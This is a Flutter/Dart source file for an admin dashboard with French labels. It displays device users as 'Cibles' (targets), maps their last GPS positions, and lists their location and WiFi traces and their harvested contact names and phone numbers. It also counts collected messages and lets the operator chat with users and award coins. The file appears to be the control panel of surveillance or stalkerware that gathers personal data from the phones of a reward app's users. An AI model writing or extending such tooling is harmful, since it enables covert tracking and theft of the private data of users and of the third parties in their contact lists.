import 'package:flutter/material.dart';
import 'package:flutter_map/flutter_map.dart';
import 'package:latlong2/latlong.dart' hide Path; 
import 'package:provider/provider.dart';

import '../../data/sources/supabase_service.dart';
import '../../data/sources/user_data_service.dart';
import 'messenger_screen.dart';

class AdminScreen extends StatefulWidget {
  const AdminScreen({super.key});

  @override
  State<AdminScreen> createState() => _AdminScreenState();
}

class _AdminScreenState extends State<AdminScreen> with SingleTickerProviderStateMixin {
  late TabController _tabController;
  final SupabaseService _supabase = SupabaseService();
  late Future<List<Map<String, dynamic>>> _usersFuture;

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 6, vsync: this);
    _usersFuture = _supabase.fetchUniqueUsers();
  }

  void _refreshData() {
    setState(() {
      _usersFuture = _supabase.fetchUniqueUsers();
    });
  }

  @override
  void dispose() {
    _tabController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Sigma Dashboard Pro', style: TextStyle(fontWeight: FontWeight.bold)),
        actions: [
          IconButton(icon: const Icon(Icons.refresh), onPressed: _refreshData),
        ],
        bottom: TabBar(
          controller: _tabController,
          isScrollable: true,
          tabs: const [
            Tab(icon: Icon(Icons.dashboard), text: 'Stats'),
            Tab(icon: Icon(Icons.view_carousel), text: 'Ads'),
            Tab(icon: Icon(Icons.people), text: 'Cibles'),
            Tab(icon: Icon(Icons.map), text: 'Carte'),
            Tab(icon: Icon(Icons.location_history), text: 'Traces'),
            Tab(icon: Icon(Icons.contacts), text: 'Contacts'),
          ],
        ),
      ),
      body: TabBarView(
        controller: _tabController,
        children: [
          _DashboardSummary(supabase: _supabase),
          _CarouselManager(supabase: _supabase),
          _UserList(usersFuture: _usersFuture, supabase: _supabase, onRefresh: _refreshData),
          _AdminMapView(supabase: _supabase, onRefresh: _refreshData),
          _DataList(fetcher: _supabase.fetchUserActivity, type: 'activity'),
          _DataList(fetcher: _supabase.fetchContacts, type: 'contacts', showSearch: true),
        ],
      ),
    );
  }
}

class _CarouselManager extends StatefulWidget {
  final SupabaseService supabase;
  const _CarouselManager({required this.supabase});
  @override
  State<_CarouselManager> createState() => _CarouselManagerState();
}

class _CarouselManagerState extends State<_CarouselManager> {
  final _text = TextEditingController();
  final _img = TextEditingController();
  final _link = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(16.0),
      child: Column(
        children: [
          const Text("📢 Ajouter au Carrousel", style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
          const SizedBox(height: 15),
          TextField(controller: _text, decoration: const InputDecoration(labelText: "Texte de la bannière")),
          TextField(controller: _img, decoration: const InputDecoration(labelText: "URL de l'image")),
          TextField(controller: _link, decoration: const InputDecoration(labelText: "Lien externe")),
          const SizedBox(height: 10),
          FilledButton.icon(
            onPressed: () async {
              await widget.supabase.addCarouselItem(_text.text, _img.text, _link.text);
              _text.clear(); _img.clear(); _link.clear();
              ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("Bannière ajoutée !")));
            },
            icon: const Icon(Icons.add),
            label: const Text("Publier"),
          ),
          const Divider(height: 40),
          const Expanded(child: Center(child: Text("Gestion des soumissions utilisateurs (À implémenter)"))),
        ],
      ),
    );
  }
}

class _AdminMapView extends StatelessWidget {
  final SupabaseService supabase;
  final VoidCallback onRefresh;
  const _AdminMapView({required this.supabase, required this.onRefresh});

  @override
  Widget build(BuildContext context) {
    return FutureBuilder<List<Map<String, dynamic>>>(
      future: supabase.fetchUsersWithLocation(),
      builder: (context, snapshot) {
        if (!snapshot.hasData) return const Center(child: CircularProgressIndicator());
        final users = snapshot.data!;
        final markers = users.where((u) => (u['user_activity'] as List).isNotEmpty).map((user) {
          final lastPos = (user['user_activity'] as List).first;
          final String pseudo = user['pseudo'] ?? user['device_id'].toString().substring(0, 8);
          final point = LatLng(lastPos['latitude'] as double, lastPos['longitude'] as double);
          return Marker(
            point: point,
            width: 120, height: 85,
            alignment: Alignment.bottomCenter,
            child: GestureDetector(
              onTap: () => _showUserSheet(context, user),
              child: Column(mainAxisSize: MainAxisSize.min, children: [
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                    decoration: BoxDecoration(color: Colors.deepPurple, borderRadius: BorderRadius.circular(12)),
                    child: Text(pseudo, style: const TextStyle(color: Colors.white, fontSize: 10, fontWeight: FontWeight.bold), overflow: TextOverflow.ellipsis),
                  ),
                  const Icon(Icons.location_on_rounded, color: Colors.red, size: 36),
                ],
              ),
            ),
          );
        }).toList();

        return FlutterMap(
          options: MapOptions(initialCenter: markers.isNotEmpty ? markers.first.point : const LatLng(36.75, 3.05), initialZoom: 6),
          children: [
            TileLayer(urlTemplate: 'https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', subdomains: const ['a', 'b', 'c', 'd']),
            MarkerLayer(markers: markers),
          ],
        );
      },
    );
  }

  void _showUserSheet(BuildContext context, Map<String, dynamic> user) {
    final String pseudo = user['pseudo'] ?? user['device_id'].toString().substring(0, 8);
    showModalBottomSheet(
      context: context,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      builder: (context) => Padding(
        padding: const EdgeInsets.all(24),
        child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Text(pseudo, style: const TextStyle(fontSize: 22, fontWeight: FontWeight.bold)),
                Text("Coins: ${user['coins'] ?? 0}", style: const TextStyle(color: Colors.orange, fontWeight: FontWeight.bold)),
              ],
            ),
            const SizedBox(height: 8),
            Text("Modèle: ${user['model'] ?? 'Inconnu'}", style: const TextStyle(color: Colors.grey)),
            const Divider(height: 32),
            Row(
              children: [
                Expanded(
                  child: FilledButton.icon(
                    onPressed: () {
                      Navigator.pop(context);
                      Navigator.push(context, MaterialPageRoute(builder: (context) => DetailedChatScreen(userId: user['device_id'], pseudo: pseudo)));
                    },
                    icon: const Icon(Icons.chat_bubble),
                    label: const Text("Chat"),
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: FilledButton.icon(
                    onPressed: () {
                      Navigator.pop(context);
                      _showAddCoinsDialog(context, user['device_id'], pseudo);
                    },
                    icon: const Icon(Icons.monetization_on),
                    label: const Text("Donner Coins"),
                    style: FilledButton.styleFrom(backgroundColor: Colors.orange[800]),
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  void _showAddCoinsDialog(BuildContext context, String userId, String pseudo) {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: Text("Coins pour $pseudo"),
        content: TextField(controller: ctrl, keyboardType: TextInputType.number, decoration: const InputDecoration(labelText: "Nombre de coins")),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("Annuler")),
          FilledButton(onPressed: () async {
            final amount = int.tryParse(ctrl.text) ?? 0;
            if (amount > 0) {
              await supabase.addCoins(userId, amount);
              onRefresh();
            }
            if (context.mounted) Navigator.pop(context);
          }, child: const Text("Ajouter")),
        ],
      ),
    );
  }
}

class _DashboardSummary extends StatelessWidget {
  final SupabaseService supabase;
  const _DashboardSummary({required this.supabase});
  @override
  Widget build(BuildContext context) {
    return FutureBuilder<Map<String, int>>(
      future: supabase.fetchStats(),
      builder: (context, snapshot) {
        if (!snapshot.hasData) return const Center(child: CircularProgressIndicator());
        final stats = snapshot.data!;
        return GridView.count(
          crossAxisCount: 2, padding: const EdgeInsets.all(16),
          children: [
            _statCard("WiFi", stats['wifi']!, Icons.wifi, Colors.blue),
            _statCard("GPS", stats['activity']!, Icons.my_location, Colors.orange),
            _statCard("Contacts", stats['contacts']!, Icons.contacts, Colors.green),
            _statCard("Messages", stats['messages']!, Icons.message, Colors.purple),
          ],
        );
      },
    );
  }
  Widget _statCard(String label, int val, IconData icon, Color color) {
    return Card(
      child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
        Icon(icon, color: color, size: 32),
        Text(val.toString(), style: const TextStyle(fontSize: 20, fontWeight: FontWeight.bold)),
        Text(label, style: const TextStyle(fontSize: 12)),
      ]),
    );
  }
}

class _UserList extends StatelessWidget {
  final Future<List<Map<String, dynamic>>> usersFuture;
  final SupabaseService supabase;
  final VoidCallback onRefresh;
  const _UserList({required this.usersFuture, required this.supabase, required this.onRefresh});

  @override
  Widget build(BuildContext context) {
    final currentUserId = context.read<UserDataService>().deviceId;
    return FutureBuilder<List<Map<String, dynamic>>>(
      future: usersFuture,
      builder: (context, snapshot) {
        if (!snapshot.hasData) return const Center(child: CircularProgressIndicator());
        final users = snapshot.data!.where((u) => u['device_id'] != currentUserId).toList();
        return ListView.builder(
          itemCount: users.length,
          itemBuilder: (context, index) {
            final user = users[index];
            final String pseudo = user['pseudo'] ?? user['device_id'].substring(0, 8);
            return ListTile(
              leading: const CircleAvatar(child: Icon(Icons.person)),
              title: Text(pseudo),
              subtitle: Text("Coins: ${user['coins'] ?? 0}"),
              trailing: Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  IconButton(
                    icon: const Icon(Icons.add_circle, color: Colors.green),
                    onPressed: () => _showAddCoinsDialog(context, user['device_id'], pseudo),
                  ),
                  IconButton(
                    icon: const Icon(Icons.chat, color: Colors.orange),
                    onPressed: () => Navigator.push(context, MaterialPageRoute(builder: (context) => DetailedChatScreen(userId: user['device_id'], pseudo: pseudo))),
                  ),
                ],
              ),
            );
          },
        );
      },
    );
  }

  void _showAddCoinsDialog(BuildContext context, String userId, String pseudo) {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: Text("Ajouter des Coins à $pseudo"),
        content: TextField(controller: ctrl, keyboardType: TextInputType.number, decoration: const InputDecoration(labelText: "Montant")),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("Annuler")),
          FilledButton(onPressed: () async {
            final amount = int.tryParse(ctrl.text) ?? 0;
            if (amount > 0) {
              await supabase.addCoins(userId, amount);
              onRefresh();
            }
            if (context.mounted) Navigator.pop(context);
          }, child: const Text("Ajouter")),
        ],
      ),
    );
  }
}

class _DataList extends StatefulWidget {
  final Future<List<Map<String, dynamic>>> Function(int, {String? query}) fetcher;
  final String type;
  final bool showSearch;
  const _DataList({required this.fetcher, required this.type, this.showSearch = false});
  @override
  State<_DataList> createState() => _DataListState();
}

class _DataListState extends State<_DataList> {
  final List<Map<String, dynamic>> _items = [];
  String _query = "";
  bool _loading = false;
  int _offset = 0;
  @override
  void initState() { super.initState(); _loadMore(reset: true); }
  Future<void> _loadMore({bool reset = false}) async {
    if (_loading) return;
    if (reset) { _items.clear(); _offset = 0; }
    setState(() => _loading = true);
    final data = await widget.fetcher(_offset, query: _query);
    if (mounted) setState(() { _items.addAll(data); _offset += data.length; _loading = false; });
  }
  @override
  Widget build(BuildContext context) {
    return Column(children: [
      if (widget.showSearch) Padding(padding: const EdgeInsets.all(8), child: TextField(decoration: const InputDecoration(hintText: "Rechercher...", prefixIcon: Icon(Icons.search)), onChanged: (v) { _query = v; _loadMore(reset: true); })),
      Expanded(child: ListView.builder(itemCount: _items.length, itemBuilder: (context, index) {
        final item = _items[index];
        return ListTile(
          title: Text(widget.type == 'contacts' ? item['name'] : (item['ssid'] ?? "Trace")),
          subtitle: Text(widget.type == 'contacts' ? item['phone'] : (item['timestamp'] ?? "")),
        );
      })),
    ]);
  }
}
